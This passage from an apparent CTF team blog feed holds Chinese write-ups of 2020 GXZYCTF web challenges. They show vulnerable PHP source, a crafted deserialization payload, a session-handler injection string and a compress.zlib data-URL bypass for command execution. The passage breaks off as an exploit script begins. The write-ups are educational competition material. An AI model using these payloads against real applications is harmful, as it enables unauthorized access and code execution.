class=&quot;string&quot;&gt;&#39;/[A-Za-z0-9]/i&#39;&lt;/span&gt;,$head))&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        die(&#39;Head can\&#39;t be like this!&#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(preg_match(&#39;/log/i&#39;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        die(&#39;No No No&#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Don\&#39;t use strange protocol!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $funcname = $head.&lt;span class=&quot;string&quot;&gt;&#39;curl_init&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $ch = $funcname();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($ch)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_setopt($ch, CURLOPT_URL, $url);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_setopt($ch, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        $output = curl_exec($ch);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_close($ch);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        $output = &lt;span class=&quot;string&quot;&gt;&#39;rua&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; sprintf($begin.&lt;span class=&quot;string&quot;&gt;&#39;%d&#39;&lt;/span&gt;,$output);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_SSRF" scheme="https://boiteam.github.io/tags/Web-SSRF/"/>
    
      <category term="Web_python格式化字符串" scheme="https://boiteam.github.io/tags/Web-python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF eazytrick_gzmtu</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:29:57.952Z</updated>
    
    <content type="html"><![CDATA[<p>首先进入页面提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=Y 或者 Y=<span class="number">2020</span></span><br></pre></td></tr></table></figure><p>然后经过测试，发现这是经过date函数处理的，而绕过这个函数，只需要在每个字符前面添加反斜杠</p><p><img src="/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/1584694675(1).jpg" alt="1584694675(1)"></p><p>然后就是正常的SQL注入，基本没有过滤任何函数</p><p>得到数据库的内容为</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url： /eGlhb2xldW5n username： <span class="keyword">admin</span> <span class="keyword">password</span>： <span class="number">20200202</span>goodluck</span><br></pre></td></tr></table></figure><p>访问 /eGlhb2xldW5n，登录后台后存在文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="regexp">//</span>localhost<span class="regexp">/var/</span>www<span class="regexp">/html/i</span>ndex.php</span><br></pre></td></tr></table></figure><p>这儿使用file://localhost绕过本地</p><p>然后读取得到的源码为：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$time = date($_GET[<span class="string">'time'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from `content` where `createtime` = '$time' "</span>;</span><br><span class="line">$r = $conn-&gt;query($sql);</span><br><span class="line">$content = $r-&gt;fetch_array(MYSQL_ASSOC);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>eGlhb2xldW5n/check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include</span>(<span class="string">"../conn.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'login'</span>]))</span><br><span class="line">&#123;<span class="keyword">die</span>(<span class="string">'请登录!'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">$parts = parse_url($url);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>) &#123;   </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'请从本地访问'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|fl|la|ag|fla|lag|log/is"</span>, $parts[<span class="string">'path'</span>]))&#123;</span><br><span class="line">readfile($url);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">die</span>(<span class="string">'不要搞这些奇奇怪怪的东西。'</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gf;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"> $number = str_split($number,<span class="number">2</span>);</span><br><span class="line"> <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line"> $str = $str .chr($num);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> strtolower($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">  $content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过正则用<code>%0a</code>，两位的限制，它最后有个<code>tolowercase()</code>，可以用大写绕过，</p><p>字母的过滤，利用取反操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'FLAG'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res += str(ord(i))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $gf;</span><br><span class="line">&#125;</span><br><span class="line">$s = <span class="string">"70766571"</span>;</span><br><span class="line">$s = urlencode(~$s);</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;gf = urldecode(<span class="string">'~'</span>.$s);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="comment">//另一种写法</span></span><br><span class="line"><span class="comment">//$a = new trick();</span></span><br><span class="line"><span class="comment">//$a-&gt;gf = '~'.(~'70766571');</span></span><br></pre></td></tr></table></figure><p>最终结果为Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM/IycnKyM4iO30=</p><p>然后url编码传参即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先进入页面提示&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;?time=Y 或者 Y=&lt;span class=&quot;number&quot;&gt;2020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_sql注入" scheme="https://boiteam.github.io/tags/Web-sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Web_伪协议" scheme="https://boiteam.github.io/tags/Web-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF hackme</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_hackme/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_hackme/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:21:51.759Z</updated>
    
    <content type="html"><![CDATA[<p>考点一、源码泄露</p><p>扫到源码</p><p><img src="/2020/03/09/2020_GXZYCTF_hackme/kx1.jpg" alt></p><p>考点二、session反序列化</p><p>在login.php内包含了init.php，其中设置了序列化处理器，并且session是以文件形式保留的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start()</span><br></pre></td></tr></table></figure><p>而profile.php和core/init.php中使用了另外的序列化处理器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_save_path(<span class="string">'../session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure><p>考点就很明显了。handler的不同点在于：</p><ul><li><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</p></li><li><p>php 键名+竖线（|）+经过serialize()函数处理过的值</p></li><li><p>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</p></li><li><p>参考 <a href="https://www.cnblogs.com/hf99/p/9746038.html" target="_blank" rel="noopener">https://www.cnblogs.com/hf99/p/9746038.html</a></p></li></ul><p>正好可以发现，在upload_sign.php中，<code>$_SESSION[&#39;sign&#39;]</code>是完全可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sign'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_POST[<span class="string">'sign'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = <span class="string">"这里空空如也哦"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checksign(<span class="keyword">$this</span>-&gt;sign)) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'sign'</span>] = <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"???"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而core中要求我们的<code>$_SESSION[&#39;admin&#39;]</code>为1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">($session)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($session <span class="keyword">as</span> $keys =&gt; $values) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($values <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($key === <span class="string">'admin'</span> &amp;&amp; $value === <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#变成管理员吧，奥利给</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以控制sign这个session，利用序列化handler的差异进行session反序列化，将<code>$_SESSION[&#39;admin&#39;]</code>反序列化为1，本地生成序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//    public $sign;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng = <span class="keyword">new</span> info();</span><br><span class="line"><span class="keyword">echo</span> serialize($y1ng);</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"info"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">i</span>:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>在upload_sign.php进行POST提交以下内容</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sign=<span class="number">12123</span>|O:<span class="number">4</span>:<span class="string">"info"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"admin"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>访问core/index.php 可以发现session验证成功，得到了core的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点三、BYPASS</p><p>这里对URL进行了匹配过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$res = parse_url($url);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">$code = file_get_contents($url);</span><br><span class="line"><span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">@exec($code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了data://，要求必须是127.0.0.1，还要<code>file_get_contents()</code></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">compress.zlib:</span>//data:<span class="subst">@127</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>/text/palin,ls</span><br><span class="line"></span><br><span class="line"><span class="symbol">compress.zlib:</span>//data:<span class="subst">@127</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>?<span class="comment">;base64,bHM=</span></span><br></pre></td></tr></table></figure><p>然后命令执行就和hitcon那个差不多，直接拿过来脚本跑一下，不过记得要设置一下cookie为PHPSESSID才行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> 